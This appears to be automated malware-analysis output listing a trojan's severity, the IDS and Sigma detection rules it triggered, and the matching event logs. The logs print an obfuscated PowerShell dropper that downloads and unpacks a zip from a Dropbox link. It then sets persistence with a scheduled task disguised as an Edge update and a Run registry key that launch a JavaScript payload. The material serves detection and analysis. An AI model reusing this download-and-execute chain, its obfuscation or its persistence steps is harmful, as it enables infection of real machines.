threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_ids_results.rule_msg: ET POLICY Dropbox.com Offsite File Backup in Use
crowdsourced_ids_results.rule_raw: alert tls [108.160.162.0/20,162.125.0.0/16,192.189.200.0/23,199.47.216.0/22,205.189.0.0/24,209.99.70.0/24,45.58.64.0/20] 443 -> $HOME_NET any (msg:"ET POLICY Dropbox.com Offsite File Backup in Use"; flow:established,to_client; tls.cert_subject; content:"CN=*.dropbox.com"; fast_pattern; threshold: type limit, count 1, seconds 300, track by_src; reference:url,www.dropbox.com; reference:url,dereknewton.com/2011/04/dropbox-authentication-static-host-ids/; classtype:policy-violation; sid:2012647; rev:7; metadata:created_at 2011_04_07, confidence High, signature_severity Informational, updated_at 2022_03_25;)

sigma_analysis_results.rule_title: Windows Shell/Scripting Processes Spawning Suspicious Programs
sigma_analysis_results.rule_description: Detects suspicious child processes of a Windows shell and scripting processes such as wscript, rundll32, powershell, mshta...etc.

sigma_analysis_results.rule_title: Change PowerShell Policies to an Insecure Level

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values: @{ScriptBlockText=$e1={$du = "htt"+"ps://www.dro"+"pbox.com/scl/fi/icvpzbx4vn6lcthva168z/zzJG.zip?rlkey=kntc36792grkm64xriqputbdq&st=px51yl8u&dl=1";try{$g = new-object System.Net.WebClient;$tg = "c:\\programdata\\gs.zip";.("{2}{3}{0}{1}"-f 'ebRe','quest','Invo','ke-W') ${d`U} -OutFile ${tG};Expand-Archive -Path $tg -D 'C:\\Programdata';$g = 'sch'+'tasks /create /sc minute /mo 2 /tn AGM'+'icrosoftE'+'dgeUpdate'+'Expanding'+'[7923498737] /tr "ws'+'cript //e:ja'+'vascr'+'ipt //b C:\\Pr'+'ogramData\\83972.tmp" /f';cm [TRUNCATED]; Path=; ScriptBlockId=e8db041f-c54b-4da6-8407-fc4b72744174; MessageTotal=1; MessageNumber=1; EventID=4104}

@{ScriptBlockText=$du = "htt"+"ps://www.dro"+"pbox.com/scl/fi/icvpzbx4vn6lcthva168z/zzJG.zip?rlkey=kntc36792grkm64xriqputbdq&st=px51yl8u&dl=1";try{$g = new-object System.Net.WebClient;$tg = "c:\\programdata\\gs.zip";.("{2}{3}{0}{1}"-f 'ebRe','quest','Invo','ke-W') ${d`U} -OutFile ${tG};Expand-Archive -Path $tg -D 'C:\\Programdata';$g = 'sch'+'tasks /create /sc minute /mo 2 /tn AGM'+'icrosoftE'+'dgeUpdate'+'Expanding'+'[7923498737] /tr "ws'+'cript //e:ja'+'vascr'+'ipt //b C:\\Pr'+'ogramData\\83972.tmp" /f';cmd /c  [TRUNCATED]; MessageTotal=1; ScriptBlockId=398388fd-fe42-4078-8b7a-3edded1e15d5; Path=; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_description: Detects modification of autostart extensibility point (ASEP) in registry.
sigma_analysis_results.rule_author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)

match_context.values: @{RuleName=T1060,RunKey; EventType=SetValue; Details=c:\\windows\\system32\\wscript.exe //b //e:javascript C:\\ProgramData\\83972.tmp; Image=C:\Windows\system32\reg.exe; EventID=13; TargetObject=HKU\S-1-5-21-4005801669-2598574594-602355426-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\GUpdate2}

sigma_analysis_results.rule_title: Potential Persistence Attempt Via Run Keys Using Reg.EXE
sigma_analysis_results.rule_description: Detects suspicious command line reg.exe tool adding key to RUN key in Registry

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=Cmd.Exe; Hashes=MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18; Description=Windows Command Processor; EventID=1; ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass -f c:\programdata\p.ps1; CommandLine="C:\Windows\system32\cmd.exe" /c "reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v GUpdate2 /t REG_SZ /d "c:\\windows\\system32\\wscript.exe //b //e:javascript C:\\ProgramData\\83972.tmp" /f"; FileVersion=10.0.19041.746 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\cmd.exe; Company=Microsoft Corporation}

@{Hashes=MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=reg.exe; Product=Microsoft\xae Windows\xae Operating System; Description=Registry Console Tool; FileVersion=10.0.19041.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\system32\cmd.exe" /c "reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v GUpdate2 /t REG_SZ /d "c:\\windows\\system32\\wscript.exe //b //e:javascript C:\\ProgramData\\83972.tmp" /f"; CommandLine=reg  add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v GUpdate2 /t REG_SZ /d "c:\\windows\\system32\\wscript.exe //b //e:javascript C:\\ProgramData\\83972.tmp" /f; EventID=1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\reg.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

sigma_analysis_results.rule_description: Detects the creation of scheduled tasks by user accounts via the "schtasks" utility.

match_context.values: @{Hashes=MD5=796B784E98008854C27F4B18D287BA30,SHA256=356280CCA63CA5E887FDBE5CB4105A53341FBAC9219EFC51621DF9BA8EE9838B,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=schtasks.exe; Product=Microsoft\xae Windows\xae Operating System; Description=Task Scheduler Configuration Tool; EventID=1; ParentCommandLine="C:\Windows\system32\cmd.exe" /c "schtasks /create /sc minute /mo 2 /tn AGMicrosoftEdgeUpdateExpanding[7923498737] /tr "wscript //e:javascript //b C:\\ProgramData\\83972.tmp" /f"; CommandLine=schtasks  /create /sc minute /mo 2 /tn AGMicrosoftEdgeUpdateExpanding[7923498737] /tr "wscript //e:javascript //b C:\\ProgramData\\83972.tmp" /f; FileVersion=10.0.19041.906 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\schtasks.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects PowerShell creating a PowerShell file (.ps1). While often times this behavior is benign, sometimes it can be a sign of a dropper script trying to achieve persistence.

match_context.values: @{Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\ProgramData\p.ps1; EventID=11}

sigma_analysis_results.rule_title: PowerShell Script With File Upload Capabilities
sigma_analysis_results.rule_description: Detects PowerShell scripts leveraging the "Invoke-WebRequest" cmdlet to send data via either "PUT" or "POST" method.
